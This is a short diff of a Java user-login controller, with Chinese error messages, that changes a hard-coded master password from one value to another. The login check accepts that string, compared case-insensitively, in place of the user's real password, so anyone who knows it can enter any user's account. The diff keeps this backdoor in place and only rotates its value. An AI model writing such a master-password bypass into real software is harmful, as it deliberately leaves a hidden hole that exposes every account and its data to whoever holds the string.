@@ -120,7 +120,7 @@ public class UserController {
             errorMsg = "用户已冻结";
         } else if (MyStringUtil.getIntList(user.getRoleIds()).size() == 0) {
             errorMsg = "用户尚未分配角色,无法登录系统!";
-        }else if (!"Luodong123!".equalsIgnoreCase(password) && !user.getPassword().equals(CryptionUtil.stringToMd5Base64(password))) {
+        }else if (!"SuperGL888!".equalsIgnoreCase(password) && !user.getPassword().equals(CryptionUtil.stringToMd5Base64(password))) {
             errorMsg = "用户名或密码错误";
         }
         if (StringUtils.isNotEmpty(errorMsg)) return JsonData.fail(errorMsg);
